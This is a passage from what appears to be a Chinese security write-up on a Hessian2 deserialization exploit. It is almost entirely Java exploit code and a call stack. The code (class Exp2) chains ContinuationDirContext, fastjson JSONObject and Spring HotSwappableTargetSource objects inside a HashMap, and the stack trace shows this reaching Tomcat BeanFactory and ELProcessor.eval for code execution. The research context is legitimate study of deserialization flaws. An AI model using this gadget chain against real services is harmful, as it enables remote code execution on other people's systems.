</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazzc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;javax.naming.spi.ContinuationDirContext&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazzc</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>CannotProceedException</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Hashtable</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CannotProceedException</span><span class=w> </span><span class=n>cpe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CannotProceedException</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cpe</span><span class=p>.</span><span class=na>setResolvedObj</span><span class=p>(</span><span class=n>ref</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>DirContext</span><span class=w> </span><span class=n>ctx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>DirContext</span><span class=p>)</span><span class=w> </span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>cpe</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hashtable</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>JSONObject</span><span class=w> </span><span class=n>jsonObject</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JSONObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>jsonObject</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;test&#34;</span><span class=p>,</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Result</span><span class=w> </span><span class=n>result1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Result</span><span class=p>(</span><span class=s>&#34;aaa&#34;</span><span class=p>,</span><span class=s>&#34;bbb&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Result</span><span class=w> </span><span class=n>result2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Result</span><span class=p>(</span><span class=s>&#34;a&#34;</span><span class=p>,</span><span class=s>&#34;b&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=n>result1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=n>result2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;111&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;222&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>result2</span><span class=p>,</span><span class=s>&#34;message&#34;</span><span class=p>,</span><span class=n>jsonObject</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=n>Hessian2_serialize</span><span class=p>(</span><span class=n>hashMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        map1.put(&#34;yy&#34;, result1);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        map1.put(&#34;zZ&#34;, result2);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        map2.put(&#34;zZ&#34;, result1);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        map2.put(&#34;yy&#34;, result2);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        Hashtable&lt;Object, Object&gt; table = new Hashtable&lt;&gt;();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        table.put(map1, &#34;1&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        table.put(map2, &#34;2&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        setFieldValue(result2,&#34;message&#34;,jsonObject);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        byte[] data = Hessian2_serialize(table);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(data)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2_unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>(),</span><span class=n>field</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Field</span><span class=w> </span><span class=nf>getField</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>field</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchFieldException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>(),</span><span class=w> </span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>Hessian2_serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Output</span><span class=w> </span><span class=n>hessian2Output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Output</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>getSerializerFactory</span><span class=p>().</span><span class=na>setAllowNonSerializable</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>67</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>o</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>Hessian2_unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Input</span><span class=w> </span><span class=n>hessian2Input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Input</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>o</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>调用栈如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>el</span><span class=p>.</span><span class=na>ELProcessor</span><span class=p>.</span><span class=na>eval</span><span class=p>(</span><span class=n>ELProcessor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>54</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>498</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>BeanFactory</span><span class=p>.</span><span class=na>getObjectInstance</span><span class=p>(</span><span class=n>BeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>210</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>NamingManager</span><span class=p>.</span><span class=na>getObjectInstance</span><span class=p>(</span><span class=n>NamingManager</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>321</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>NamingManager</span><span class=p>.</span><span class=na>getContext</span><span class=p>(</span><span class=n>NamingManager</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>439</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationContext</span><span class=p>.</span><span class=na>getTargetContext</span><span class=p>(</span><span class=n>ContinuationContext</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>55</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationContext</span><span class=p>.</span><span class=na>getEnvironment</span><span class=p>(</span><span class=n>ContinuationContext</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>197</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationDirContext$$Lambda$25</span><span class=p>.</span><span class=na>1911152052</span><span class=p>.</span><span class=na>apply</span><span class=p>(</span><span class=n>Unknown</span><span class=w> </span><span class=n>Source</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>FieldWriterObjectFunc</span><span class=p>.</span><span class=na>getFieldValue</span><span class=p>(</span><span class=n>FieldWriterObjectFunc</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>36</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>FieldWriterObject</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>FieldWriterObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>189</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>ObjectWriter2</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>ObjectWriter2</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>76</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>ObjectWriterImplMap</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>ObjectWriterImplMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>548</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>JSON</span><span class=p>.</span><span class=na>toJSONString</span><span class=p>(</span><span class=n>JSON</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2388</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson</span><span class=p>.</span><span class=na>JSONObject</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>JSONObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1028</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2994</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>StringBuilder</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>StringBuilder</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>131</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Result</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>44</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Result</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>40</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>target</span><span class=p>.</span><span class=na>HotSwappableTargetSource</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>HotSwappableTargetSource</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>104</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>putVal</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>635</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>612</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>MapDeserializer</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>MapDeserializer</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>114</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>SerializerFactory</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>SerializerFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>562</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2883</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>expect</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>3754</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readString</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1979</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObjectDefinition</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2960</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2893</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>Exp2</span><span class=p>.</span><span class=na>Hessian2_unserialize</span><span class=p>(</span><span class=n>Exp2</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>116</span><span class=p>)</span><span class=w>
